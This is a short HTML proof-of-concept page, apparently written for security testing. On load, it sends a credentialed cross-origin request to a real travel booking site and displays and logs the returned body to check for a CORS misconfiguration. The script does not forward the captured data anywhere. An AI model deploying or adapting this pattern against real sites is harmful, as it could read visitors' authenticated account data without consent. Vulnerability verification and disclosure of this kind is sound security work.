<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>OYO CORS PoC</title>
</head>
<body>
    <h2>OYO CORS Verification PoC</h2>
    <pre id="output">Testing...</pre>

<script>
const output = document.getElementById("output");

async function testCORS() {
    try {
        const response = await fetch(
            "https://www.oyorooms.com/?modal=onboarding",
            {
                method: "GET",
                credentials: "include",
                mode: "cors"
            }
        );

        const body = await response.text();

        output.textContent =
            "CORS SUCCESS\n\n" +
            "Status: " + response.status + "\n" +
            "Response type: " + response.type + "\n" +
            "Final URL: " + response.url + "\n\n" +
            "Response body:\n" +
            body.substring(0, 5000);

        console.log("[+] CORS allowed");
        console.log("[+] Status:", response.status);
        console.log("[+] Type:", response.type);
        console.log("[+] Final URL:", response.url);
        console.log("[+] Body:", body);

    } catch (error) {
        output.textContent =
            "CORS BLOCKED\n\n" +
            error;

        console.error("[-] CORS blocked:", error);
    }
}

testCORS();
</script>
</body>
</html>
